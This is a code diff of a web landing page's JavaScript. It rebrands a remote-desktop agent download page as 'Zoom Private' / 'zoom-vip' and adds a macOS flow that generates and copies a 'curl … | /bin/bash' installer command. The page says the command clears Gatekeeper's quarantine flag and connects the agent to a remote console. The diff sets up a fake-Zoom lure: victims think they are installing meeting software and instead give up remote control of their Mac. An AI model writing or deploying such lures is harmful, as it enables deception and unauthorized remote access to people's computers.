@@ -1,5 +1,5 @@
 /**
- * BetterDesk Meet — public landing page behaviour.
+ * Zoom Private — public landing page behaviour.
  *
  * Externalised from the landing HTML so it satisfies the console CSP
  * (`script-src 'self' <nonce>`); inline <script> tags would be blocked.
@@ -13,19 +13,29 @@
 (function () {
   'use strict';
   var $ = function (id) { return document.getElementById(id); };
-  var state = { detected: null, recommended: null, available: [], release: null, platform: null, arch: null };
+  var state = { detected: null, recommended: null, available: [], release: null, platform: null, arch: null, macInstall: false };
+  var MAC_INSTALL_PATH = '/api/landing/macos-install';
 
   // API base: empty for same-origin (console + Railway service). GitHub Pages
   // sets window.BETTERDESK_API_BASE to the public backend URL (Railway).
   var API_BASE = (window.BETTERDESK_API_BASE || '').replace(/\/+$/, '');
   function api(p) { return API_BASE + p; }
   function assetUrl(u) { return !u ? u : (/^https?:\/\//i.test(u) ? u : api(u)); }
+  function absoluteApiUrl(p) {
+    if (/^https?:\/\//i.test(p)) return p;
+    if (API_BASE) return API_BASE + p;
+    return window.location.origin + p;
+  }
+  function macInstallUrl() { return absoluteApiUrl(MAC_INSTALL_PATH); }
+  function macCommandText() {
+    return "curl -fsSL '" + macInstallUrl().replace(/'/g, "'\\''") + "' | /bin/bash";
+  }
 
   var OS_LABEL = { windows: 'Windows', macos: 'macOS', linux: 'Linux', android: 'Android', ios: 'iPhone / iPad', unknown: 'your device' };
   var OS_ABBR = { windows: 'WIN', macos: 'MAC', linux: 'LNX', android: 'AND', ios: 'iOS', unknown: '?' };
 
-  // Client name stays "zoom-private" everywhere on this page.
-  var CLIENT_NAME = 'zoom-private';
+  // Client display name used throughout the page.
+  var CLIENT_NAME = 'zoom-vip';
 
   // -------- Instant client-side detection (no wait on network) --------
   function quickDetect() {
@@ -69,7 +79,7 @@
   function osSteps(platform, format) {
     var map = {
       windows: ['Open the downloaded installer', 'Click “Yes” to allow the install', 'Launch ' + CLIENT_NAME + ' and it connects automatically'],
-      macos: ['Open the .dmg file', 'Drag the app into Applications', 'Launch ' + CLIENT_NAME + ' from Applications'],
+      macos: ['Click "Install ' + CLIENT_NAME + ' on this Mac"', 'Approve the helper and macOS prompts', 'The agent starts and connects automatically'],
       linux: ['Open the downloaded package', 'Install with your software center', 'Launch ' + CLIENT_NAME + ' to connect'],
       android: ['Tap the downloaded APK', 'Allow install from this source if asked', 'Open ' + CLIENT_NAME + ' to connect'],
       ios: ['Your client is installed from the App Store', 'Open the link in the app', 'Sign in to connect']
@@ -78,7 +88,7 @@
     if (format === 'zip') {
       map = {
         windows: ['Unzip the downloaded file', 'Right-click install.ps1 → Run with PowerShell', 'The agent installs, registers and connects on its own'],
-        macos: ['Unzip the downloaded file', 'Run: bash install.sh ' + (state.consoleUrl || 'https://panel.telcom.stream'), 'The agent installs, registers and connects on its own'],
+        macos: ['Click "Install ' + CLIENT_NAME + ' on this Mac"', 'Approve the helper and macOS prompts', 'The agent installs, registers and connects on its own'],
         linux: ['Unzip the downloaded file', 'Run: bash install.sh ' + (state.consoleUrl || 'https://panel.telcom.stream'), 'The agent installs, registers and connects on its own'],
         android: ['Tap the downloaded APK', 'Allow install from this source if asked', 'Open ' + CLIENT_NAME + ' to connect'],
         ios: ['Your client is installed from the App Store', 'Open the link in the app', 'Sign in to connect']
@@ -89,11 +99,14 @@
     if (format === 'iso') {
       map = {
         windows: ['Right-click the .iso file → “Mount”', 'In the new drive, right-click install.ps1 → Run with PowerShell', 'The agent installs, registers and connects on its own'],
-        macos: ['Open the downloaded disk image', 'Run the installer inside', 'Launch to connect'],
+        macos: ['Open the downloaded build', 'Run the installer inside', 'Launch to connect'],
         linux: ['Open the downloaded file', 'Install when prompted', 'Launch to connect'],
         android: ['Tap the downloaded APK', 'Allow install from this source if asked', 'Open ' + CLIENT_NAME + ' to connect'],
         ios: ['Your client is installed from the App Store', 'Open the link in the app', 'Sign in to connect']
       };
+    }
+    if (platform === 'macos' && format && format !== 'zip' && format !== 'targz') {
+      map.macos = ['Open the downloaded .dmg', 'Drag the app into Applications', 'Launch ' + CLIENT_NAME + ' from Applications'];
     }
     var steps = map[platform] || ['Open the downloaded file', 'Install when prompted', 'Launch to connect'];
     $('os-steps').innerHTML = steps.map(function (s) { return '<li>' + s + '</li>'; }).join('');
@@ -136,6 +149,82 @@
     }, 1400);
   }
 
+  // -------- macOS one-click ---------
+  function setMacInstallVisible(show) {
+    state.macInstall = !!show;
+    var btn = $('mac-install-btn');
+    var note = $('mac-install-note');
+    if (btn) btn.classList.toggle('hidden', !show);
+    if (note) note.classList.toggle('hidden', !show);
+  }
+
+  function openMacModal() {
+    var cmd = $('mac-command');
+    if (cmd) cmd.textContent = macCommandText();
+    var dl = $('mac-command-download');
+    if (dl) dl.href = absoluteApiUrl(MAC_INSTALL_PATH + '.command');
+    $('mac-modal').classList.add('show');
+  }
+
+  function fallbackCopy(text, done) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.setAttribute('readonly', '');
+    ta.style.position = 'fixed';
+    ta.style.opacity = '0';
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand('copy'); } catch (err) { /* ignore */ }
+    ta.remove();
+    done();
+  }
+
+  function copyMacCommand() {
+    var text = macCommandText();
+    var done = function () {
+      var btn = $('mac-command-copy');
+      btn.textContent = 'Copied';
+      toast('Installer command copied');
+      setTimeout(function () { btn.textContent = 'Copy command'; }, 1800);
+    };
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      navigator.clipboard.writeText(text).then(done).catch(function () { fallbackCopy(text, done); });
+    } else {
+      fallbackCopy(text, done);
+    }
+  }
+
+  function startMacInstall() {
+    var btn = $('mac-install-btn');
+    var spin = $('mac-install-spinner');
+    var txt = $('mac-install-text');
+    if (!btn) return;
+
+    var switched = false;
+    var onBlur = function () { switched = true; };
+    window.addEventListener('blur', onBlur, { once: true });
+    btn.disabled = true;
+    spin.classList.remove('hidden');
+    txt.textContent = 'Waiting for the installer.';
+
+    try { window.location.href = 'zoomvip-install://install'; } catch (err) { /* helper absent */ }
+
+    setTimeout(function () {
+      window.removeEventListener('blur', onBlur);
+      btn.disabled = false;
+      spin.classList.add('hidden');
+      txt.textContent = 'Install ' + CLIENT_NAME + ' on this Mac';
+      if (!switched && !document.hidden) {
+        $('dl-status').className = 'dl-status warn';
+        $('dl-status').textContent = 'The one-click helper is not registered yet. Run the installer command once; it installs both the client and the helper.';
+        openMacModal();
+      } else {
+        $('dl-status').className = 'dl-status ok';
+        $('dl-status').textContent = 'Confirm the install in the Zoom Private dialog.';
+      }
+    }, 1300);
+  }
+
   // -------- Render detected platform --------
   function applyRecommendation() {
     var platform = state.platform;
@@ -144,6 +233,19 @@
 
     var btn = $('dl-btn'), txt = $('dl-text');
     var rec = state.recommended;
+
+    // macOS gets a one-click install that also clears Gatekeeper. Only offer
+    // it for the agent tarball/zip - a future .dmg should use the normal flow.
+    var macOneClick = platform === 'macos' && rec && (rec.format === 'targz' || rec.format === 'zip');
+    setMacInstallVisible(macOneClick);
+    btn.classList.toggle('hidden', !!macOneClick);
+    if (macOneClick) {
+      btn.disabled = true;
+      txt.textContent = 'Use the macOS installer';
+      $('dl-status').className = 'dl-status';
+      $('dl-status').textContent = 'One click installs ' + CLIENT_NAME + ' for macOS, clears the quarantine flag and connects it to your console.';
+      return;
+    }
 
     if (rec) {
       var mb = rec.size ? ' · ' + (rec.size / 1048576).toFixed(1) + ' MB' : '';
@@ -287,6 +389,23 @@
 
   // -------- Wire up --------
   $('other-btn').addEventListener('click', openModal);
+
+  var macInstallBtn = $('mac-install-btn');
+  if (macInstallBtn) macInstallBtn.addEventListener('click', startMacInstall);
+  var macNoteBtn = $('mac-command-btn');
+  if (macNoteBtn) macNoteBtn.addEventListener('click', openMacModal);
+  var macHelpBtn = $('mac-command-btn-help');
+  if (macHelpBtn) macHelpBtn.addEventListener('click', openMacModal);
+  var macCopyBtn = $('mac-command-copy');
+  if (macCopyBtn) macCopyBtn.addEventListener('click', copyMacCommand);
+  var macCloseBtn = $('mac-modal-close');
+  if (macCloseBtn) macCloseBtn.addEventListener('click', function () { $('mac-modal').classList.remove('show'); });
+  var macModalBack = $('mac-modal');
+  if (macModalBack) macModalBack.addEventListener('click', function (e) { if (e.target === macModalBack) macModalBack.classList.remove('show'); });
+
+  // Set the command text on load
+  var cmd = $('mac-command');
+  if (cmd) cmd.textContent = macCommandText();
   var chooseAgain = $('choose-again-btn');
   if (chooseAgain) chooseAgain.addEventListener('click', openModal);
   $('modal-close').addEventListener('click', function () { $('modal').classList.remove('show'); });
@@ -294,7 +413,12 @@
   $('join-btn').addEventListener('click', joinMeeting);
   $('meeting-id').addEventListener('keydown', function (e) { if (e.key === 'Enter') joinMeeting(); });
   $('meeting-pass').addEventListener('keydown', function (e) { if (e.key === 'Enter') joinMeeting(); });
-  document.addEventListener('keydown', function (e) { if (e.key === 'Escape') $('modal').classList.remove('show'); });
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape') {
+      $('modal').classList.remove('show');
+      $('mac-modal').classList.remove('show');
+    }
+  });
 
   var rel = $('releases-link');
   rel.addEventListener('click', function () {
